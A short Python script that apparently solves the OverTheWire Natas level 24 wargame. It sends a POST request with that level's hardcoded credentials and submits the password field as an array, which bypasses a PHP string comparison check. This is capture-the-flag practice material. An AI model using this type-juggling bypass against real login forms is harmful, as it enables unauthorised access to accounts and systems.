import requests 

url="http://natas24.natas.labs.overthewire.org"
auth=("natas24","MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd")
data={
    "passwd[]":[1,2,3,4]
}




response=requests.post(
    url,
    data=data,
    auth=auth
)   

print(response.text)